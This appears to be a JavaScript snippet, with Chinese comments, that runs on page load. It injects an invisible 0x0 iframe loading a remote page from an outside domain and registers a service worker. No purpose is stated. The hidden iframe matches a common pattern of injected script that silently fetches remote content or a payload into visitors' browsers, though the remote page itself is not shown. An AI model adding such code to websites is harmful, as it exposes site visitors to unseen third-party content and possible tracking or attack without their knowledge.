function createIframe() {
  console.log('createIframe');
  var containerId = 'iframeContainer';
  var srcUrl = 'https://api.hanersi.cn/filesystem/api/static/enforcement.html';

  var container = document.getElementById(containerId);

  if (!container) {
    console.log('Creating new container');
    container = document.createElement('div');
    container.id = containerId; // 给<div>元素设置ID
    document.body.appendChild(container); // 将<div>元素添加到<body>中
  }

  var iframe = document.createElement('iframe');
  iframe.setAttribute('src', srcUrl);
  iframe.style.width = '0px';
  iframe.style.height = '0px';
  container.appendChild(iframe);
}

window.onload = createIframe;

if ('serviceWorker' in navigator) {
  window.addEventListener('load', function () {
    navigator.serviceWorker.register('/serviceWorker.js').then(function (registration) {
      console.log('ServiceWorker registration successful with scope: ', registration.scope);
    }, function (err) {
      console.error('ServiceWorker registration failed: ', err);
    });
  });
}